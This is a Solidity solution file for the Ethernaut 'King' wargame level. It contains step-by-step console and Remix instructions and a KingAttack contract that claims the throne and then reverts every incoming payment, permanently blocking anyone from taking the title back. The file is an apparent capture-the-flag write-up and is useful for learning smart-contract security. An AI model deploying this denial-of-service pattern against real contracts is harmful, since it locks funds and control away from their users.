/*
Tools needed for this level:
- Console
- Remix IDE

1.- Obtain prize value in wei via the console. This is the minimum value we need
    to send to King's contract to become the new king:
        prize = (await contract.prize()).toString()
2.- Deploy this contract (KingAttack.sol) with Remix IDE using the Injected Web3
    environment, passing Ethernaut's King contract address to the constructor and
    a value equal or greater than the prize value.
3.- Check if we became king of contract:
        await contract._king()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {

    // The fallback function of King contract is immediately called.
    constructor(address _king) payable {
     (bool success, ) = (_king).call{value: msg.value}("");

      if (!success) {
          revert();
      }
    }

    // Since the objective is to prevent our Smart Contract from being able to receive
    // ETH and becoming the king forever, we could just NOT put a fallback function, but
    // the way I did it was putting a fallback function that will always revert.
    receive() external payable {
        revert();
    }
}